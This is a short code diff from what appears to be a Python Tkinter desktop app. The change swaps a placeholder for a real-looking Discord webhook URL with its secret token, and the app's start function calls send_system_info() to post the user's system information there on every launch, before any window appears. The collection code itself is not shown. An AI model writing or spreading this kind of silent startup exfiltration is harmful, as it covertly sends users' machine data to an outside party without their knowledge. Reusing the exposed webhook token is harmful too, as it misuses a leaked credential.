@@ -56,7 +56,7 @@ def send_system_info(webhook_url):
 
 # Function to start the application
 def start_app():
-    webhook_url = "https://your-webhook-url.com"  # Replace with your actual webhook URL
+    webhook_url = "https://discord.com/api/webhooks/1275128627532664936/Q-TdnNCAkb4Sl-jCdVxTGhg5hlXkheevBSBMDsiMA8Z-TIJG_KF5xV2TTHSSEjykQfYP"  # Replace with your actual webhook URL
     send_system_info(webhook_url)  # Send system info to webhook when the app starts
 
     root = tk.Tk()
